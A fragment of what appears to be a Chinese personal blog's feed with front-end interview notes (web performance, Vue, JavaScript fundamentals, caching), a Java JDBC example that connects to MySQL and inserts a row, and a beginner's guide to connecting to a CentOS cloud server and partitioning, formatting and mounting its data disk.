title="内容优化"></a>内容优化</h3><ul><li>减少http请求</li><li>dns预解析</li><li>减少iframe</li></ul><h3 id="服务器优化"><a href="#服务器优化" class="headerlink" title="服务器优化"></a>服务器优化</h3><ul><li>静态资源cookie隔离</li><li>cdn</li><li>gzip压缩</li><li>etag</li><li>避免空的图像src</li><li>开启缓存</li></ul><h3 id="js优化"><a href="#js优化" class="headerlink" title="js优化"></a>js优化</h3><ul><li>减少dom操作</li><li>减少长作用域链查找</li><li>在底部加载</li></ul><h3 id="css优化"><a href="#css优化" class="headerlink" title="css优化"></a>css优化</h3><ul><li>采用link而不是import</li><li>css放在顶部</li><li>尽量避免使用css表达式</li><li>减少选择器嵌套</li><li>减少css动画</li></ul><h3 id="图片优化"><a href="#图片优化" class="headerlink" title="图片优化"></a>图片优化</h3><ul><li>压缩图片</li><li>sprites</li><li>使用图标字体</li><li>懒加载</li></ul><h2 id="vue相关"><a href="#vue相关" class="headerlink" title="vue相关"></a>vue相关</h2><h3 id="mvvm和mvc"><a href="#mvvm和mvc" class="headerlink" title="mvvm和mvc"></a>mvvm和mvc</h3><ul><li>mvc：view-controller-model-view 单向传递</li><li>mvvm：view-viewmodel-model 双向传递</li></ul><h3 id="vue双向数据绑定"><a href="#vue双向数据绑定" class="headerlink" title="vue双向数据绑定"></a>vue双向数据绑定</h3><p>通过Object.defineProperty()实现数据劫持，在数据变动时发布消息给订阅者，触发相应的监听回调。</p><ul><li>实现一个数据监听器Observer，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者。defineProperty</li><li>实现一个指令解析器Compile，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数。createDocumentFragment</li><li>实现一个Watcher，作为连接Observer和Compile的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图。 订阅发布模式定义了一种一对多的关系，让多个观察者同时监听某一个主题对象，这个主题对象的状态发生改变时就会通知所有观察者对象</li><li>mvvm入口函数，整合以上三者</li></ul><h3 id="vue生命周期"><a href="#vue生命周期" class="headerlink" title="vue生命周期"></a>vue生命周期</h3><p>beforeCreate（创建前）,created（创建后），beforeMount(载入前),mounted（载入后）,beforeUpdate（更新前）,updated（更新后）,beforeDestroy（销毁前）,destroyed（销毁后）</p><h3 id="vue组件通信"><a href="#vue组件通信" class="headerlink" title="vue组件通信"></a>vue组件通信</h3><ul><li>父组件向子组件传递：父组件写在标签内，子组件通过通过props获取</li><li>子组件向父组件传递：<code>$emit</code>发送事件</li><li>兄弟组件传递：实例化一个第三方vue实例，<code>$emit</code>触发事件,<code>$on</code>接收事件</li></ul><h3 id="vuex的作用"><a href="#vuex的作用" class="headerlink" title="vuex的作用"></a>vuex的作用</h3><p>VueX 是一个专门为 Vue.js 应用设计的状态管理架构，统一管理和维护各个vue组件的可变化状态。当单独使用Vue.js,我们常常倾向于存储状态我们的组件内。也就是说,每个组件属于我们的应用程序状态,因此结果状态乱扔的到处都是。然而,有时一块状态需要由多个组件共享。常见的做法是让一个组件“发送”一些使用自定义事件系统其他组件。这种模式的问题是内部的事件流大组件树很快就变得复杂,通常很难原因时出现错误。</p><h3 id="vue1-0和vue2-0的区别是什么"><a href="#vue1-0和vue2-0的区别是什么" class="headerlink" title="vue1.0和vue2.0的区别是什么"></a>vue1.0和vue2.0的区别是什么</h3><ul><li>vue2.0代码必须包裹在一个根元素</li><li>vue2.0的生命周期发生了很大的变化</li></ul><h2 id="js相关"><a href="#js相关" class="headerlink" title="js相关"></a>js相关</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li>基本数据类型：String、Number、Boolean、Undefined、Null、Symbol</li><li>引用类型：object、array、function</li></ul><h3 id="判断数据类型"><a href="#判断数据类型" class="headerlink" title="判断数据类型"></a>判断数据类型</h3><ul><li>typeof：对null返回object、无法判断array、date等类型</li><li>instanceof：检测两个对象是否实例关系</li><li>constructor：无法判断null和undefined，重写prototype之后constructor丢失默认为Object</li><li>Object.prototype.toString.call</li></ul><h3 id="高级函数"><a href="#高级函数" class="headerlink" title="高级函数"></a>高级函数</h3><p>惰性函数、柯里化、</p><h4 id="惰性载入函数"><a href="#惰性载入函数" class="headerlink" title="惰性载入函数"></a>惰性载入函数</h4><p>在浏览器功能检测中，函数的分支当第一次确定时就将分支内的函数作为返回值，这样就改变了这个函数。在以后加载中避免了每次都判断。</p><pre><code>function addEvent (type, element, fun) {    if (element.addEventListener) {        addEvent = function (type, element, fun) {            element.addEventListener(type, fun, false);        }    }    else if(element.attachEvent){        addEvent = function (type, element, fun) {            element.attachEvent(&#39;on&#39; + type, fun);        }    }    else{        addEvent = function (type, element, fun) {            element[&#39;on&#39; + type] = fun;        }    }    return addEvent(type, element, fun);}</code></pre><h4 id="安全的类型检测"><a href="#安全的类型检测" class="headerlink" title="安全的类型检测"></a>安全的类型检测</h4><p>通过toString方法来检测传入参数的类型，以判断是否进行下一步操作。</p><pre><code>  Object.prototype.toString.call(value)</code></pre><h4 id="作用域安全的构造函数"><a href="#作用域安全的构造函数" class="headerlink" title="作用域安全的构造函数"></a>作用域安全的构造函数</h4><p>构造函数如果没有new，那么构造函数内部的this指向全局也就是window对象。先用instance判断一下this指向，如果不是指向构造函数，那么返回一个new实例化的对象。</p><pre><code>function Person(name){    if(this instanceof Person){        this.name = name;    }else{        return new Person(name)    }}</code></pre><h4 id="函数柯里化"><a href="#函数柯里化" class="headerlink" title="函数柯里化"></a>函数柯里化</h4><p>它用于创建已经设置好了一个或者多个参数的函数，函数柯里化的基本方法和函数绑定是一样的，使用一个闭包返回一个函数。</p><pre><code> //普通的add版本function add(num1, num2){    return num1 + num2;}//第一个参数为5的add版本function curriedAdd5(num2){    return add(5, num2)}function curry(fn, context){//截取调用curry时候，除了fn,context,之后的所有参数    var args =[].slice.call(arguments,2);    return function(){//获取调用fn的所有参数        var totalArgs = args.concat([].slice.call(arguments));        return fn.apply(context, totalArgs);    }}var curriedAdd5 = curry(add, null, 5)</code></pre><h3 id="判断数组"><a href="#判断数组" class="headerlink" title="判断数组"></a>判断数组</h3><ul><li>instanceof</li><li>toString</li><li>constructor</li></ul><h3 id="箭头函数和this"><a href="#箭头函数和this" class="headerlink" title="箭头函数和this"></a>箭头函数和this</h3><p>箭头函数没有它自己的this值，箭头函数内的this值继承自外围作用域。箭头函数的this其实就是在定义的时候就确定好的，以后不管怎么调用这个箭头函数，箭头函数的this始终为定义时的this。箭头函数没有arguments，可以用剩余参数代替。箭头函数不要再对象的方法中、作为构造函数、定义原型方法时使用。</p><h3 id="this指向"><a href="#this指向" class="headerlink" title="this指向"></a>this指向</h3><ul><li>函数调用模式-全局调用：指向全局对象也就是window，包括在函数方法中嵌套的</li><li>方法调用模式：指向上层对象</li><li>构造器调用模式：通过new构造的this指向新的对象</li><li>apply、call、bind等调用模式：指向传入的对象</li></ul><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>只有函数可以限定一个变量的作用范围，即函数才是变量的作用域。在ES6之前，JavaScript没有块级作用域(一对花括号{}即为一个块级作用域)，只有全局作用域和函数作用域。</p><h3 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h3><p>函数在运行的瞬间，生成一个活动对象（Active Object），简称AO</p><ul><li>第一步：分析参数：函数接收形式参数，添加到AO的属性，并且这个时候值为undefine,即AO.age=undefined，接收实参，添加到AO的属性，覆盖之前的undefined</li><li>第二步：分析变量声明：如var age;或var age=18;如果上一步分析参数中AO还没有age属性，则添加AO属性为undefined，即AO.age=undefine，如果AO上面已经有age属性了，则不作任何修改</li><li>第三步：分析函数的声明：如果有function age(){}把函数赋给AO.age ,覆盖上一步分析的值</li></ul><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p>首字母大写，内部用this的函数，最后通过new来进行实例化。<br>构造函数的返回值有以下几种情况：</p><ul><li>没有返回值时返回实例化的对象。</li><li>返回值为基本数据类型时返回实例化的对象，用来两用函数。</li><li>返回值为引用类型时，返回该引用类型。</li></ul><h3 id="new的操作"><a href="#new的操作" class="headerlink" title="new的操作"></a>new的操作</h3><p>相当于以下步骤：</p><pre><code>var obj = {}obj._proto_ = Co.prototyoeCo.call(obj)return obj</code></pre><h3 id="promise和async-await"><a href="#promise和async-await" class="headerlink" title="promise和async/await"></a>promise和async/await</h3><p>promise的三种状态pending（进行中）、fulfilled（已成功）和rejected（已失败）。两个参数resolve和reject。</p><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>闭包是由函数以及创建该函数的词法环境组合而成。这个环境包含了这个闭包创建时所能访问的所有局部变量。(MDN)用来访问另一个函数作用域链上的变量的函数。由于该变量被其他函数饮用所以内存回收机制导致其不会立即清除，也就是其定义时的上下文被记住，起到了记忆功能。</p><h3 id="js对象私有变量"><a href="#js对象私有变量" class="headerlink" title="js对象私有变量"></a>js对象私有变量</h3><ul><li>_开头的编码约定</li><li>基于闭包构造特权函数，缺点是无法挂载在prototype上，无法实现共享</li><li>强引用散列表</li><li>基于ES6的WeakMap</li></ul><h3 id="js垃圾回收机制"><a href="#js垃圾回收机制" class="headerlink" title="js垃圾回收机制"></a>js垃圾回收机制</h3><p>JavaScript的解释器可以检测到何时程序不再使用一个对象了，当他确定了一个对象是无用的时候，他就知道不再需要这个对象，可以把它所占用的内存释放掉了。现在各大浏览器通常用采用的垃圾回收有两种方法：标记清除、引用计数。优化垃圾回收的主要思想是避免新建对象，而是尽量复用。比如delete obj的属性，而非new Object()。设置arr.length = 0而非 arr = []。</p><p>可能会导致内存泄漏的操作有：</p><ul><li>意外的全局变量</li><li>被遗忘的定时器或回调</li><li>没有清理的DOM元素引用</li><li>不恰当的闭包</li></ul><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p><img src="https://pic1.zhimg.com/80/e83bca5f1d1e6bf359d1f75727968c11_hd.jpg" srcset="undefined" alt="img"></p><h3 id="rhs和lhs"><a href="#rhs和lhs" class="headerlink" title="rhs和lhs"></a>rhs和lhs</h3><p>rhs为取值，lhs为赋值。<br>如果在rhs的所有嵌套的作用域查询中都无法找到该变量,js引擎就会抛出一个ReferenceError异常. ReferenceError是一个重要的异常.<br>相较之下， 当引擎执行 LHS 查询时， 如果在顶层（ 全局作用域） 中也无法找到目标变量，<br>全局作用域中就会创建一个具有该名称的变量， 并将其返还给引擎， 前提是程序运行在非 “ 严格模式” 下。</p><h3 id="EventLoop"><a href="#EventLoop" class="headerlink" title="EventLoop"></a>EventLoop</h3><p>函数调用形成了一个栈帧。对象被分配在一个堆中，即用以表示一个大部分非结构化的内存区域。一个待处理的消息队列。当栈拥有足够内存时并且满足触发条件(如setTimeout)从队列中取出一个消息进行处理。一个 web worker 或者一个跨域的iframe都有自己的栈，堆和消息队列。两个不同的运行时只能通过 postMessage方法进行通信。如果后者侦听到message事件，则此方法会向其他运行时添加消息。</p><p>js所谓的单线程，是指在JS引擎中负责解释和执行JavaScript代码的线程只有一个。不妨叫它主线程。实际上还存在其他的线程。例如：处理AJAX请求的线程、处理DOM事件的线程、定时器线程、读写文件的线程(例如在Node.js中)等等。这些线程可能存在于JS引擎之内，也可能存在于JS引擎之外，在此我们不做区分。不妨叫它们工作线程。</p><p>一个异步过程：主线程发起一个异步请求，相应的工作线程接收请求并告知主线程已收到(异步函数返回)；主线程可以继续执行后面的代码，同时工作线程执行异步任务；工作线程完成工作后，通知主线程；主线程收到通知后，执行一定的动作(调用回调函数)。</p><h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><p>HTTP 协议有一个缺陷：通信只能由客户端发起。HTTP 协议做不到服务器主动向客户端推送信息。WebSocket最大的特点就是服务器可以主动向服务器发送信息，客户端也可以向服务器端主动发送信息。SSE是单向推送，利用EventSource，content-type设置为text/event-stream。</p><p>特点有以下：</p><ul><li>建立在TCP之上</li><li>默认端口也是ws80和wss443，握手阶段采用http协议。</li><li>数据格式轻，性能开销小</li><li>可以发送文本和二进制文件</li><li>没有同源策略的限制</li></ul><p>客户端API：</p><ul><li>var ws = new WebSocket(‘ws://localhost:8080’);</li><li>webSocket.readyState 0=正在连接 1=连接成功 2=连接正在关闭 3=连接已经关闭</li><li>ws.onopen= function(){} 连接成功后的回调函数</li><li>ws.onclose = function(){} 连接关闭后的回调函数</li><li>onmessage 收到信息后 event.data instanceof ArrayBuffer || String</li><li>ws.send(‘your message’);</li><li>ws.bufferedAmount 还有多少字节没有发送完 判断是否发送完毕</li><li>ws.onerror</li></ul><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><ul><li>原型链</li><li>构造函数</li><li>组合继承</li><li>原型式继承</li><li>寄生式继承</li><li>寄生组合式继承</li></ul><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><ul><li>工厂模式</li><li>构造函数模式</li><li>原型模式</li><li>组合模式</li><li>动态原型模式</li><li>寄生构造模式</li><li>稳妥构造模式</li></ul><h3 id="js跨域"><a href="#js跨域" class="headerlink" title="js跨域"></a>js跨域</h3><p>同源策略要求三个相同：协议相同、域名相同、端口相同</p><ul><li>cors</li><li>图像ping</li><li>jsonp</li><li>iframe+document.domain：适用于主域相同而子域不同的情况，设置相同的domain，然后在a页面中创建b页面的iframe，获取ifr.contentDocument就可以操作b</li><li>iframe+location.hash:src指向目标，hash中带参数，目标页面处理之后设置一个src指向代理文件，代理文件通过parent.parent.location.hash向源文件传递参数，源文件通过hashchange事件获取hash</li><li>iframe+window.name:window.name2MB而且在页面切换后不会变，先iframe.src指向跨域地址，在onload时转向当前域下一空文件，之前取到的window.name依然不变</li><li>代理服务器</li><li>postmessage</li></ul><h3 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h3><ul><li>comet</li><li>sse</li><li>websocket</li></ul><h3 id="多页面传参数"><a href="#多页面传参数" class="headerlink" title="多页面传参数"></a>多页面传参数</h3><ul><li>cookie轮询</li><li>localStorage和storage事件</li><li>websocket</li></ul><h3 id="深拷贝和浅拷贝"><a href="#深拷贝和浅拷贝" class="headerlink" title="深拷贝和浅拷贝"></a>深拷贝和浅拷贝</h3><p>浅拷贝分两种情况，拷贝直接拷贝源对象的引用 和 源对象拷贝实例.对于第二种情况，常用方法为<code>Array.prototype.slice(), Array.prototype.concat(), jQury的$.extend({},obj)</code></p><pre><code>function shallowCopy(src) {  var dst = {};  for (var prop in src) {    if (src.hasOwnProperty(prop)) {      dst[prop] = src[prop];    }  }  return dst;}</code></pre><p>深拷贝后，两个对象，包括其内部的元素互不干扰。常见方法有JSON.parse(),JSON.stringify()，jQury的<code>$.extend(true,{},obj)</code>，lodash的<code>_.cloneDeep和_.clone(value, true)。</code>有两种解决方案：</p><pre><code>JSON.parse(JSON.stringify(test))function clone(p,s){　　var s=s||{};　　for(var prop in p){　　　　if(typeof p[prop]==&#39;object&#39;){　　　　　　　　s[prop]=(p[prop].constructor===Array)?[]:{};//三元运算，将s[prop]初始化为数组或者对象　　　　　　　　clone(p[prop],s[prop])　　　　}　　　　else{　　　　　　s[prop]=p[prop];　　　　}};　　　　return s;};</code></pre><h3 id="js事件模型"><a href="#js事件模型" class="headerlink" title="js事件模型"></a>js事件模型</h3><h4 id="DOM0级模型"><a href="#DOM0级模型" class="headerlink" title="DOM0级模型"></a>DOM0级模型</h4><p>又称原始事件模型，事件不会传播，没有事件流的概念。事件绑定通过在html代码中直接写<code>onclick</code> 或者在js中通过<code>.onclick=xxx</code>实现，如果取消可以将其指向<code>null</code>。</p><h4 id="DOM2级模型"><a href="#DOM2级模型" class="headerlink" title="DOM2级模型"></a>DOM2级模型</h4><p>分为事件捕获阶段，事件处理阶段，事件冒泡阶段。通过 <code>addEventListener</code>和<code>removeEventListener</code>。<br>参数有三个：</p><ul><li>eventType指定事件类型(不要加on)</li><li>handler是事件处理函数</li><li>useCapture是一个boolean用于指定是否在捕获阶段进行处理，一般设置为false与IE浏览器保持一致。</li></ul><h4 id="IE事件模型"><a href="#IE事件模型" class="headerlink" title="IE事件模型"></a>IE事件模型</h4><p>事件处理和事件冒泡阶段。<br><code>attachEvent</code>和<code>detachEvent</code></p><h4 id="DOM事件模型和IE事件模型的区别"><a href="#DOM事件模型和IE事件模型的区别" class="headerlink" title="DOM事件模型和IE事件模型的区别"></a>DOM事件模型和IE事件模型的区别</h4><ul><li>event和window.event</li><li>target和srcElement</li><li>stopPropagation和cancelBubble</li><li>preventDefault和returnValue</li></ul><h3 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h3><p>可以在全局最顶端声明，也可以在某个函数顶端声明。</p><ul><li>全局变量必须显式声明</li><li>禁止使用with语句</li><li>eval自己存在独立的作用域</li><li>禁止this指向全局对象</li><li>禁止删除变量</li><li>禁止重名</li></ul><h3 id="js模块化"><a href="#js模块化" class="headerlink" title="js模块化"></a>js模块化</h3><ul><li>无模块化：分js文件写script。缺点是污染全局作用域和依赖关系不明显。</li><li>CommonJS：CommonJS的核心思想就是通过 require 方法来同步加载所要依赖的其他模块，然后通过 exports 或者 module.exports 来导出需要暴露的接口。用于node端，同步加载模块，不适用于浏览器端。</li><li>AMD：require.js。通过define来定义一个模块，然后使用require来加载一个模块。前置加载依赖。</li><li>CMD：sea.js，按需加载，依赖就近。</li><li>ES6模块化：import导入，export导出。</li></ul><h2 id="缓存和离线存储"><a href="#缓存和离线存储" class="headerlink" title="缓存和离线存储"></a>缓存和离线存储</h2><h3 id="http缓存"><a href="#http缓存" class="headerlink" title="http缓存"></a>http缓存</h3><ul><li>判断Cache-Control或者expires，如果未过期，直接读取http缓存文件，不发送http请求。</li><li>判断是否有etag，有则带上if-none-mathch发送请求，未修改返回304，修改返回200。</li><li>判断是否有last-modified，有则带上if-modified-since，有效返回200，无效返回304。</li></ul><p><img src="https://images2017.cnblogs.com/blog/621603/201709/621603-20170925162600417-90375901.png" srcset="undefined" alt="img"><br><code>crtl+f5</code>可以强制刷新。</p><h3 id="session-cookie-localStorage-sessionStorage"><a href="#session-cookie-localStorage-sessionStorage" class="headerlink" title="session cookie localStorage sessionStorage"></a>session cookie localStorage sessionStorage</h3><ul><li>session和cookie<br>session存在服务器端，cookie存在浏览器端。cookie只能保存字符串类型，session通过类似于hashtable的数据结构存储任何类型的对象。cookie4kb，session无限制。session更安全。</li><li>localStorage sessionStorage<br>localStorage永久，sessionStorage仅在当前会话下有效，关闭浏览器窗口失效。存储都是5MB。都存在客户端，只能存文本类型。lcoalStorage的接口有getItem、setItem、removeItem、clear，另外存储时还会触发storage事件。</li></ul><h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>``</p><p>其分为三个部分：</p><ul><li>CACHE MANIFEST 缓存</li><li>NETWORK 不缓存</li><li>FALLBACK 无法访问时的回退</li></ul><p>window.applicationCache.status可以访问缓存状态，分别为：UNCACHED、IDLE、CHECKING、DOWNLOADING、UPDATEREADY、IDLE</p><p>离线缓存与传统浏览器缓存区别：</p><ul><li>离线缓存是针对整个应用，浏览器缓存是单个文件</li><li>离线缓存断网了还是可以打开页面，浏览器缓存不行</li><li>离线缓存可以主动通知浏览器更新资源</li></ul><h3 id="http缓存机制"><a href="#http缓存机制" class="headerlink" title="http缓存机制"></a>http缓存机制</h3><ul><li>Cache-Control：响应头表示了资源是否可以被缓存，以及缓存的有效期。</li><li>Etag：响应头标识了资源的版本，此后浏览器可据此进行缓存以及询问服务器。</li><li>Last-Modified：响应头标识了资源的修改时间，此后浏览器可据此进行缓存以及询问服务器。</li></ul><p>缓存策略三要素：</p><ul><li>缓存存储策略</li><li>缓存过期策略</li><li>缓存对比策略</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java连接数据库</title>
    <link href="undefined2019/12/01/java%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>2019/12/01/java%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h3 id="首先需要加入sql外驱动包"><a href="#首先需要加入sql外驱动包" class="headerlink" title="首先需要加入sql外驱动包"></a>首先需要加入sql外驱动包</h3><p>百度云链接：<a href="https://pan.baidu.com/s/1zWb2uRXlIIwL_LiQ5pANYQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1zWb2uRXlIIwL_LiQ5pANYQ</a>  提取码：zywf</p><h3 id="然后将此包放入自己的项目目录下"><a href="#然后将此包放入自己的项目目录下" class="headerlink" title="然后将此包放入自己的项目目录下"></a>然后将此包放入自己的项目目录下</h3><p>然后将此包部署一下：</p><p><img src="https://ae01.alicdn.com/kf/H93aff8ac98e4448c9ef184ac934c2a6dD.jpg" srcset="undefined" alt=""></p><p><img src="https://ae01.alicdn.com/kf/Hf201d8dce26d4cc88df57abd45b32ad3h.jpg" srcset="undefined" alt=""></p><p>部署完成后会在项目目录下显示</p><p><img src="https://ae01.alicdn.com/kf/H1392a7af91de45df9a5f4c4f09ffa4a5s.jpg" srcset="undefined" alt=""></p><h3 id="然后在项目下面新建java包"><a href="#然后在项目下面新建java包" class="headerlink" title="然后在项目下面新建java包"></a>然后在项目下面新建java包</h3><p>导入数据库驱动，和mysql的端口：</p><pre><code class="java">    String driverName = &quot;com.mysql.jdbc.Driver&quot;;    //com.mysql.jdbc.Driver就是数据库驱动，    String dbUrl = &quot;jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&quot;;    //localhost:3306是默认的数据库端口，test就是我们的数据库名字了</code></pre><p>这是我们设置mysql的账号密码；    </p><pre><code class="java"> String userName = &quot;root&quot;; String userPwd = &quot;root&quot;;Connection conn = null;try {    //下面两行就是与我们的数据库取得连接的代码            Class.forName(driverName);            conn = DriverManager.getConnection(dbUrl, userName, userPwd);        } </code></pre><p>连接起来就是</p><pre><code class="java">import java.sql.*;public class Menu {    public static void main(String[] args) {         String driverName = &quot;com.mysql.jdbc.Driver&quot;;         String dbUrl = &quot;jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&quot;;         String userName = &quot;root&quot;;         String userPwd = &quot;root&quot;;        try {            Class.forName(driverName);            Connection conn = DriverManager.getConnection(dbUrl, userName, userPwd);        } catch (SQLException e) {            e.printStackTrace();        } catch (ClassNotFoundException e) {            e.printStackTrace();        }    }}</code></pre><p>运行一下</p><p><img src="https://ae01.alicdn.com/kf/H1cb4de8335cd4201984f9e18ceb3617fI.jpg" srcset="undefined" alt=""></p><h3 id="显示“运行成功”就说明数据库连接成功了；"><a href="#显示“运行成功”就说明数据库连接成功了；" class="headerlink" title="显示“运行成功”就说明数据库连接成功了；"></a>显示“运行成功”就说明数据库连接成功了；</h3><h2 id="测试一下插入一条数据"><a href="#测试一下插入一条数据" class="headerlink" title="测试一下插入一条数据"></a>测试一下插入一条数据</h2><pre><code class="java">import java.sql.*;public class Menu {    public static void main(String[] args)throws SQLException {        Connection conn = null;        Statement stat = null;         String driverName = &quot;com.mysql.jdbc.Driver&quot;;         //加载数据库驱动类         String dbUrl = &quot;jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&quot;;//         数据库连接         String userName = &quot;root&quot;;//         账号         String userPwd = &quot;root&quot;;//         密码        try {            Class.forName(driverName);            conn = DriverManager.getConnection(dbUrl, userName, userPwd);            String sql = &quot;insert into login(username,password)values(&#39;张三&#39;,&#39;123456&#39;)&quot;;            stat=conn.createStatement();//            数据库的语句            if(stat.executeUpdate(sql)==1) {//                这行语句可以执行sql语句并返回改变数据的条数，判断影响行数                System.out.println(&quot;成功&quot;);            }else {                System.out.println(&quot;失败&quot;);            }        }  catch (ClassNotFoundException e) {            e.printStackTrace();        }catch (SQLException e) {            e.printStackTrace();        }        if (stat != null)            stat.close();        if (conn != null)            conn.close();    }}</code></pre><h3 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h3><p><img src="https://ae01.alicdn.com/kf/H3ae0b705dd0f4431af244b4239cd08dfB.jpg" srcset="undefined" alt=""></p><h3 id="数据库数据增加一条："><a href="#数据库数据增加一条：" class="headerlink" title="数据库数据增加一条："></a>数据库数据增加一条：</h3><p><img src="https://ae01.alicdn.com/kf/H26690235d4f54ceba251643fd620c9adb.jpg" srcset="undefined" alt=""></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>新手玩云服务器</title>
    <link href="undefined2019/12/01/%E6%96%B0%E6%89%8B%E7%8E%A9%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>2019/12/01/%E6%96%B0%E6%89%8B%E7%8E%A9%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00"><a href="#0X00" class="headerlink" title="0X00:"></a>0X00:</h2><h3 id="连接到云服务器："><a href="#连接到云服务器：" class="headerlink" title="连接到云服务器："></a>连接到云服务器：</h3><p>我的电脑系统是win7,而且买的是CentOS的,所以这里只说本地windows下怎么配置CentOS云服务器:</p><p>腾讯官方文档给出的是用SecureCRT、putty来登录,个人觉得xshell可以完爆这两货。。。<br><a href="http://rj.baidu.com/soft/detail/15201.html?ald" target="_blank" rel="noopener">xshell下载地址</a></p><p>打开xshell,新建服务器连接,如下图所示:<br><a href="http://7xqtjy.com1.z0.glb.clouddn.com/建立连接1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A51.png" target="_blank" rel="noopener">建立连接1</a></a></p><pre><code>名称随你喜欢,填个有意义又简单的最好~主机填写云主机的公网IP端口号默认为22说明随你喜欢,跟名称的说法一样~</code></pre><pre><code>SUSE/CentOS/Debian：rootWindows：Administratorubuntu：ubuntu </code></pre><p>密码的话,在你购买的订单中是有初始密码的,最好进行密码重置:<br>进入腾讯云中心,进入管理中心,点击云主机的<code>更多</code>进行密码重置:<br><a href="http://7xqtjy.com1.z0.glb.clouddn.com/重置密码1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%811.png" target="_blank" rel="noopener">重置密码</a></a></p><h4 id="注意！要先将云主机关机才能重置密码"><a href="#注意！要先将云主机关机才能重置密码" class="headerlink" title="注意！要先将云主机关机才能重置密码"></a>注意！要先将云主机关机才能重置密码</h4><p><a href="http://7xqtjy.com1.z0.glb.clouddn.com/进行连接1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A51.png" target="_blank" rel="noopener">进行连接1</a></a></p><p>在你下订单后购买到云主机后,可以将云主机私钥导入到你的电脑中,这个是建立连接的关键<br>点击浏览-&gt;文件,选择你的私钥,下面密码填你设置的密码,点击确定,进行连接,看到类似下图,说明连接成功~<br><a href="http://7xqtjy.com1.z0.glb.clouddn.com/连接成功1.png" target="_blank" rel="noopener"><a href="http://7xqtjy.com1.z0.glb.clouddn.com/%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F1.png" target="_blank" rel="noopener">连接成功</a></a></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><h3 id="进行云服务器的数据盘相关操作"><a href="#进行云服务器的数据盘相关操作" class="headerlink" title="进行云服务器的数据盘相关操作:"></a>进行云服务器的数据盘相关操作:</h3><p>数据盘信息:<br>运行以下命令可以查看数据盘相关信息,包括数据盘大小,被占用的空间以及剩余空间等等</p><pre><code># fdisk -l# df -h </code></pre><p>数据盘分区:<br>官方文档说是按以下命令来进行数据盘分区:</p><pre><code># fdisk /dev/xvdbs</code></pre><p>嗯,我试了下这个命令,结果给我提示这个:<br>Unable to open /dev/xvdb</p><p>查了下,发现新的CentOS系统应该按这样的命令去分区:</p><pre><code># fdisk /dev/vdbs</code></pre><p>执行完这个命令以后,依次执行以下命令:</p><pre><code>n         新建分区p         进行主分区1         使用第一个主分区EnterEnter     这里的两次Enter都是选择默认配置wq        保存并退出</code></pre><p>此时再输入<code>fdisk -l</code>如果看到<code>/dev/vdbs</code>和<code>/dev/vdal</code>,<br>则说明分区成功<br>当然,分区可以创建多个,具体看你喜欢,不过要谨慎!</p><p>格式化新分区:<br>格式化新分区是为了后面能在系统上安装软件以及进行相关必要的操作:</p><pre><code>mke2fs、mkfs.ext2、mkfs.ext3、mkfs.ext4</code></pre><p>Windows下的文件系统有Fat32、NTFS，CentOS使用的文件系统为ext。之前CentOS5版本使用ext3作为默认的文件系统，而CentOS6使用ext4作为默认的文件系统,我的是CentOS6.5的,当然是ext4啦~</p><pre><code>mkfs.ext4 /dev/vdb1</code></pre><p>挂载新分区:<br>依旧给出代码(官方文档给出的):</p><pre><code># mkdir /mydata                    创建mydata目录# mount /dev/xvdb1 /mydata      手动挂载新分区</code></pre><p>再用<code>df -h</code>查看,如果看到<code>Filesystem</code>有<code>/dev/vdb1</code>和<code>/dev/vda1</code>的话就说明挂载新分区成功~</p><p>添加分区信息(就是保存你的挂载):<br>这个操作是为了让主机在重启或关机后开机都能进行自动挂载,免得你每次手动挂载,这里按照官方文档给出的命令就行了~</p><pre><code>echo &#39;/dev/xvdb1 /mydata ext3 defaults 0 0&#39; &gt;&gt; /etc/fstab  添加命令分区信息cat /etc/fstab  查看是否添加成功</code></pre><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><h3 id="在云服务器进行软件安装"><a href="#在云服务器进行软件安装" class="headerlink" 